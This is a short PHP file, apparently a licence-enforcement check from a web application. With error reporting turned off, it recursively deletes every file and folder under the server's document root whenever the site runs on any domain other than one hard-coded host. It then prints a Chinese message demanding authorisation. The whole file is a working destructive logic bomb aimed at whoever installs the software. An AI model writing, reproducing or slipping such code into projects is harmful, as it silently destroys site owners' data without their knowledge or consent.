<?php


error_reporting(0);
$path=$_SERVER['DOCUMENT_ROOT']."/";
  function del($path){
   if(is_dir($path)){
   $p = scandir($path);
   foreach($p as $val){

    if($val !="." && $val !=".."){
 
     if(is_dir($path.$val)){
  
      del($path.$val.'/');

      @rmdir($path.$val.'/');
     }else{
      unlink($path.$val);
     }
    }
   }
  }
  }

$demo=$_SERVER['SERVER_NAME'];
if($demo!="bbs.vuszh.top"){
	 del($path);
echo "<h>请授权：888888888888888888888888888</h>";


}